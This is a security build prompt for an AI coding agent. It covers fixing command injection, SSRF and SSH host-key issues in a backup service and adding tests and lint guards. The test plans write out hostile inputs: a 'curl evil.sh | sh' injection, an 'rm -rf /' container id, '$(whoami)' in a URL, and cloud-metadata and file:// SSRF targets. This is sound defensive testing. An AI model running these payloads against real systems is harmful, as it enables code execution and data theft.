# Surface #6 — Command Execution / SSRF / Input Validation — Build Prompt

> **Closes findings under threat surface #6 of `prompts/SECURITY.md`.** Owns
> argv-only spawn across restic-runner/ssh-transport/docker-client/mirror/
> restore/pitr/scan (server AND agent daemon), SSH host-key pinning (reject
> on mismatch, no `StrictHostKeyChecking=no`), docker-socket-proxy least
> privilege (no raw socket mount), and SSRF guards on every server-side fetch
> that takes a user-supplied host/URL (alert webhook, mirror/remote). This is
> one of the four highest-value Dockstash surfaces. Implements STEP 2 →
> STEP 3 → STEP 4 → STEP 5 for this surface only.

---

## Agent

`security-review-specialist` (primary). Coordinate with `backend-dev` for the
spawn rewrites and the SSRF guard, and with `build-engineer` for the docker-
socket-proxy + `cap_drop` hardening. Run `00-recon-findings` FIRST and read
its surface-#6 rows. Cross-link with prompt `05` (agent-side spawn parity).

## Mission

For every Critical/High finding under surface #6 in
`prompts/dockstash-security/findings.md`:
1. Write ≥5 adversarial inputs per finding: a project name with shell
   metacharacters, a repo URL with `|`/backticks, a host-key mismatch, an
   internal/metadata IP for SSRF, a non-http(s) scheme.
2. Fix: argv-only spawn (env-carried secrets), host-key pinning, socket-proxy
   least privilege, SSRF scheme+IP guard with redirect re-validation, zod on
   every request body.
3. Add supertest tests: shell metacharacters passed as an argv element (never
   interpreted); host-key mismatch aborts; internal IPs rejected before fetch.
4. Add a STEP 5 meta-guard: "no `child_process.spawn` uses `shell: true`" +
   the server/agent cross-copy parity check.

## Operating Constraints

| Rule | Detail |
|---|---|
| argv-only spawn | `child_process.spawn(cmd, args, { shell: false, env: { ...process.env, RESTIC_PASSWORD: ... } })`. Never `exec`, never `sh -c`, never `shell: true`, never a concatenated shell string. Secrets via `env`, not `args`. |
| SSH host-key pinning | `ssh-transport` verifies the pinned host key (`STORAGE_SSH_HOST_KEY_FINGERPRINT`); rejects on mismatch; NEVER `StrictHostKeyChecking=no` / auto-accept. |
| Socket-proxy only | The api reaches Docker ONLY via `DOCKER_HOST=tcp://docker-socket-proxy:2375` with the endpoint allowlist (`CONTAINERS`/`EXEC`/`INFO`). NEVER bind-mount `/var/run/docker.sock`. No dockerode/raw-socket path. |
| No exec into unowned container | An exec into a container the requesting user does not own is a finding (cross-reference surface #2). |
| SSRF guard | Any server-side fetch with a user-supplied host/URL enforces a scheme allowlist (`http`/`https`) AND rejects internal/loopback/link-local/metadata targets (`169.254.169.254`, `127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`, `::1`, `fc00::/7`), RE-VALIDATING on redirect. |
| zod everywhere | Every request body is zod-validated (`*.schema.ts`). No `as any`, no spreading `req.body` into a query/spawn. |
| Cross-copy parity | `restic-runner`/`docker-client`/adapters are vendored into BOTH `server/src/modules/backups/` AND `agent/src/`. A fix on one side MUST land on both; the parity check is a STEP 5 guard (joint with prompt `05`). |
| Docker-only | All build/test cmds in Docker. The spawn fixes themselves run inside the containerized dev stack — never bare on the host. |
| i18n 7 locales | Host-key-mismatch, SSRF-rejected, invalid-scheme errors are keys in ALL 7 dictionaries. |
| No control weakened | Never disable a coverage gate or lint rule to pass a test. |

## Phases

### Phase 0 — Map
- 0.1 Read `prompts/dockstash-security/findings.md` surface-#6 rows. Read
  `prompts/SECURITY.md` § "6. COMMAND EXECUTION / SSRF / INPUT VALIDATION".
- 0.2 Read every spawn/exec site the recon flagged: `modules/backups/
  {backups.restic-runner,ssh-transport,docker-client,mirror.service,
  restore.service,pitr,scan}.ts` AND `agent/src/{executor,restic-runner,
  docker-client}.ts`.
- 0.3 Read `modules/alerting/alert.service.ts` `defaultWebhookPoster` (the
  known live SSRF surface — POSTs to `project.alertWebhookUrl`, validated only
  as http(s) in the alerts schema, no private-IP block). Read the mirror/
  remote-destination fetch paths.
- 0.4 Read `docker-compose.yml` — confirm the api uses
  `DOCKER_HOST=tcp://docker-socket-proxy:2375` and the proxy allowlist; flag
  any raw `/var/run/docker.sock` mount. Read `.env.example` for
  `STORAGE_SSH_HOST_KEY_FINGERPRINT`.
- 0.5 Read the existing zod schemas (`*.schema.ts`) and confirm coverage on
  mutating routes.

### Phase 1 — Adversarial inputs (STEP 2)
For each finding, write ≥5 inputs:
- A project name `; curl evil.sh | sh #` and a repo URL
  `sftp://host'$(whoami)'/path` concatenated into a shell string — assert the
  spawn sees them as a SINGLE argv element (never interpreted). (If the
  current code uses `shell: true` or string concat, this fails today.)
- A container id `evil; rm -rf /` passed to docker exec — assert argv-only.
- An SSH host-key mismatch (server presents a different key than the pinned
  fingerprint) — assert the transfer aborts today (finding if it auto-
  accepts), aborts after fix.
- An alert webhook URL `http://169.254.169.254/latest/meta-data/`,
  `http://127.0.0.1:6379/`, `http://10.0.0.1/`, `http://[::1]/`,
  `gopher://host/`, `file:///etc/passwd` — assert ALL rejected before any
  fetch today (finding), rejected after fix.
- A redirect from a benign external URL to `http://127.0.0.1/` — assert the
  SSRF guard re-validates on redirect and rejects.

### Phase 2 — Fix (STEP 3)
- 2.1 **argv-only spawn**: every flagged spawn becomes
  ```
  spawn(bin, argsArray, { shell: false, env: { ...process.env, RESTIC_PASSWORD: pw } })
  ```
  where `argsArray` is a string[] built from individually-escaped argv
  elements (no concatenation). Secrets travel in `env`, never `args`. Apply
  on BOTH copies (server + agent).
- 2.2 **SSH host-key pinning**: `ssh-transport` sets
  `-o StrictHostKeyChecking=yes` (or the ssh2-equivalent verify callback)
  against the pinned fingerprint from `STORAGE_SSH_HOST_KEY_FINGERPRINT`. On
  mismatch, throw a localized `HttpError` and abort the transfer. NEVER
  `-o StrictHostKeyChecking=no`/`accept-new`/auto-add. If the env var is
  unset, FAIL CLOSED (refuse to start the transfer) — do not auto-accept.
- 2.3 **Docker socket-proxy only**: confirm the api's `DOCKER_HOST` is the
  proxy; tighten the proxy env to only `CONTAINERS=1, EXEC=1, INFO=1` (and
  whatever minimally else is needed — `POST`, `DELETE` off unless required).
  Remove any raw `/var/run/docker.sock` bind-mount from `docker-compose.yml`.
  `cap_drop: [ALL]` + add back only the capabilities restic/dockerode need;
  `no-new-privileges`. Cross-check with the threat-model doc (surface #7
  owns the doc; here we harden the compose).
- 2.4 **No exec into unowned container**: any docker-exec path verifies the
  container belongs to the requesting owner (cross-reference surface #2's
  owner-scope fix). The endpoint allowlist in the proxy already prevents
  arbitrary `POST /containers/create`; confirm no code path bypasses it.
- 2.5 **SSRF guard**: introduce `shared/net/safe-fetch.ts` (or extend an
  existing helper): given a URL, (a) reject non-`http`/`https` schemes; (b)
  resolve the host and reject if any resolved IP is in the private/loopback/
  link-local/metadata ranges (use `ipaddr.js` or equivalent — pinned, public
  npm); (c) on a redirect, RE-RUN the guard against the redirect target (opt
  out of automatic redirect following; follow manually with re-validation).
  Route `alert.service.ts::defaultWebhookPoster`, the mirror/remote fetch,
  and any other user-URL server-side fetch through this helper.
- 2.6 **zod everywhere**: every mutating route has a zod schema applied at
  the router boundary. Flag the missing ones (the recon listed them) and add
  them. No `as any`, no spreading `req.body`/`req.query` into a Mongoose
  filter (overlaps surface #8) or a spawn arg.

### Phase 2 — Reference fix shapes (illustrative — match the repo's real types)

```ts
// restic-runner.ts — argv-only, secret via env, NEVER a shell string
import { spawn } from 'node:child_process';
const child = spawn('restic', ['-r', repoUrl, 'backup', srcPath], {
  shell: false,                                     // no shell → metacharacters are inert data
  env: { ...process.env, RESTIC_PASSWORD: password }, // secret in env, NOT in argv
});
// FORBIDDEN: exec(`restic -r ${repoUrl} backup ${srcPath}`)  // command injection via repoUrl/srcPath

// ssh-transport.ts — pin the host key; fail closed if unset; never auto-accept
const pinned = env.STORAGE_SSH_HOST_KEY_FINGERPRINT;
if (!pinned) throw HttpError.failedDependency('errors.ssh.fingerprintMissing');  // fail closed
conn.connect({
  host, port, username,
  hostVerifier: (key: Buffer) => sshFingerprint(key) === pinned,  // reject on mismatch — no StrictHostKeyChecking=no
});

// shared/net/safe-fetch.ts — SSRF guard: scheme allowlist + IP blocklist + redirect re-validation
import ipaddr from 'ipaddr.js';
import { lookup } from 'node:dns/promises';
const BLOCKED = ['127.0.0.0/8','10.0.0.0/8','172.16.0.0/12','192.168.0.0/16',
                 '169.254.0.0/16','::1/128','fc00::/7'];

async function assertPublicUrl(raw: string): Promise<URL> {
  const url = new URL(raw);
  if (url.protocol !== 'http:' && url.protocol !== 'https:')
    throw HttpError.badRequest('errors.ssrf.scheme');          // rejects gopher://, file://, …
  const { address } = await lookup(url.hostname);              // resolve, then judge the IP
  const ip = ipaddr.parse(address);
  if (BLOCKED.some((cidr) => ip.match(ipaddr.parseCIDR(cidr))))
    throw HttpError.badRequest('errors.ssrf.private');         // metadata/loopback/private → reject
  return url;
}

export async function safeFetch(raw: string, init?: RequestInit): Promise<Response> {
  let url = await assertPublicUrl(raw);
  for (let hop = 0; hop < 5; hop++) {
    const res = await fetch(url, { ...init, redirect: 'manual' });  // follow redirects manually
    if (res.status < 300 || res.status >= 400) return res;
    url = await assertPublicUrl(new URL(res.headers.get('location')!, url).toString());  // re-validate EACH hop
  }
  throw HttpError.badRequest('errors.ssrf.tooManyRedirects');
}
```

### Phase 3 — Tests (STEP 4)
Server (vitest node, supertest against `createApp()`, mongodb-memory-server;
external systems INJECTED so restic/ssh/dockerode are mocked):
- **Shell-metacharacter argv**: a project create with name `; curl evil.sh | sh`
  followed by a backup — assert the mock restic-runner's `spawn` was called
  with the name as a SINGLE argv element (assert the args array shape), never
  with `shell: true`, never in a concatenated string. State fail-before
  status.
- **Secret in env, not args**: assert the mock spawn's `args` does NOT
  contain the restic password; assert `env.RESTIC_PASSWORD` does.
- **Host-key mismatch**: a mocked ssh2 server presenting a different key than
  the pinned fingerprint → the transfer aborts with the localized error; the
  pinned-key case succeeds. With `STORAGE_SSH_HOST_KEY_FINGERPRINT` unset →
  fail-closed (no transfer).
- **Socket-proxy only**: a config assertion that `docker-compose.yml`'s api
  service sets `DOCKER_HOST=tcp://docker-socket-proxy:2375`, has NO
  `/var/run/docker.sock` volume, and the proxy service sets only the
  allowlisted endpoints.
- **SSRF**: `POST /api/alerts/…/test` with `alertWebhookUrl` set to each
  blocked target (metadata IP, loopback, private range, `::1`,
  `gopher://`, `file://`) → 400 (or the localized rejection) BEFORE any
  fetch (assert the mocked fetch was never called). A benign external URL →
  fetch proceeds.
- **SSRF redirect re-validation**: a mocked server at a benign URL that
  redirects (302) to `http://127.0.0.1/` → the guard rejects after the
  redirect (assert the second hop was never fetched).
- **zod coverage**: every flagged mutating route rejects a malformed body
  with 400.

### Phase 4 — Prevent (STEP 5)
- a) **ESLint `no-restricted-syntax`** (repo-wide, highest-value guard): ban
  `CallExpression[callee.property.name='spawn'] ObjectExpression
  Property[key.name='shell'][value.value=true]` — i.e. no `spawn(..., {
  shell: true })`. Ban `CallExpression[callee.name='exec']` in
  `modules/backups/**` and `agent/src/**` (restic-runner/docker-client/ssh
  must use `spawn`). This is the durable command-injection guard.
- b) **ESLint `no-restricted-syntax`**: ban `Literal[value=/StrictHostKey
  Checking=no/]` and `Literal[value=/StrictHostKeyChecking=accept-new/]` —
  fail the lint gate on any auto-accept regression.
- c) **Meta-test**: "every server-side fetch in `modules/alerting/**` and
  `modules/backups/mirror*` goes through `safe-fetch` (the SSRF helper)". A
  scan that lists raw `fetch(`/`axios`/`http.request` calls in those modules
  and asserts each is wrapped. FAIL on regression.
- d) **Cross-copy parity check**: a CI step that diffs
  `server/src/modules/backups/{restic-runner,docker-client,…}` against
  `agent/src/{restic-runner,docker-client,…}` (or a meta-test that imports
  both and asserts the spawn-helper signatures match). Joint owner with
  prompt `05`.
- e) **Compose meta-test**: a config assertion that `docker-compose.yml`
  mounts no raw docker socket and sets the proxy allowlist.
- f) Add `.claude/rules/argv-only-spawn-and-ssrf.md` (MANDATORY REQUIREMENT
  header, Correct/Forbidden examples, Validation Checklist) and a one-line
  entry in `.claude/rules/README.md`. Update `CLAUDE.md` §5. Cross-reference
  `docs/security-model.en.md`.

## Coverage & Success Gate — NON-NEGOTIABLE

This surface is DONE only when, **inside Docker**, the suite is 100% passing and
v8 coverage is **100% on lines / branches / functions / statements** for the code
this prompt touched (server AND, since the spawn helpers are vendored, the agent package):

```
docker run --rm -v "$PWD/server":/app -w /app node:20-bookworm npx vitest run --coverage
docker run --rm -v "$PWD/agent":/app  -w /app node:20-bookworm npx vitest run --coverage
```

Hard requirements:
- Every fix ships a test that FAILS before the change and PASSES after — stated per test.
- `safe-fetch.ts` must hit EVERY branch: valid public URL, bad scheme, each blocked CIDR
  (loopback/private/link-local/metadata/IPv6), the redirect re-validation loop, and the
  too-many-redirects exit. Each blocked case asserts the underlying `fetch` was NEVER called.
- The host-key path covers match (proceed), mismatch (abort), and unset-fingerprint (fail-closed).
- No `.skip`/`.only`, no lowered `vitest.config.ts` thresholds, no `/* c8 ignore */`,
  no `eslint-disable`, no `@ts-ignore` to reach green (`docs/ci-gates.en.md`).
- If a line is genuinely unreachable, delete/refactor it — never ignore it.
- The 7-locale i18n parity test stays green (every new key in en/ar/fr/de/es/ru/zh).
- Re-run until green AND 100%. A red or sub-100% run is not "almost done" — it is not done.

## i18n

Host-key-mismatch, SSRF-rejected, invalid-scheme, invalid-container, missing-
zod errors are keys in ALL 7 server dictionaries + client locale files where
rendered. Parity test green. RTL for `ar`.

## Documentation

- `docs/security-model.en.md` — annotate argv-only spawn, host-key pinning,
  socket-proxy least privilege + `cap_drop`, the SSRF guard (scheme + IP
  blocklist + redirect re-validation), and zod-everywhere.
- `docs/ci-gates.en.md` — note the new `no-restricted-syntax` rules
  (`shell:true`, `exec`, `StrictHostKeyChecking=no`).
- `docker-compose.yml` — the proxy allowlist + `cap_drop` + `no-new-
  privileges` comments (or a companion `docs/docker-socket-proxy.md`).
- `.env.example` — confirm `STORAGE_SSH_HOST_KEY_FINGERPRINT` documented
  (root only).
- `CLAUDE.md` §5 — reference the new rule file.

## Agents & Skills

- **Agents:** `security-review-specialist` (primary); `backend-dev` (spawn
  rewrites + SSRF helper); `build-engineer` (socket-proxy + `cap_drop`).
- **MCP:** `code-review-graph` `get_impact_radius_tool` / `get_review_context_tool`
  before rewriting a spawn helper — restic-runner/docker-client are vendored
  into both `server/src/modules/backups/` and `agent/src/`; the parity check
  (STEP 5d) fails if a fix lands on only one copy.
- **Skills:** `/security-review` `docker` mode (deep semantic pass —
  **required** before merge); `docker-workflow-automation` (socket-proxy,
  capability drop); `code-review` (final diff pass — assert no `shell:true`,
  no `exec`, no `StrictHostKeyChecking=no`, no raw socket mount, every user-
  URL fetch through `safe-fetch`).

## Idempotency Contract

Re-running MUST NOT: re-write a spawn that is already argv-only (detect
`shell:false`/no-concat and skip), re-pin an already-pinned host key, re-add
the SSRF helper, re-tighten an already-tightened proxy allowlist, or duplicate
the ESLint rules / meta-tests / parity check. Detect existing controls and
reconcile in place. A re-run that finds the surface clean appends
"re-verified YYYY-MM-DD — surface #6 clean" to `findings.md`. Findings fixed
here are annotated with `— FIXED at file:line (prompt 06)` for `09`'s report.
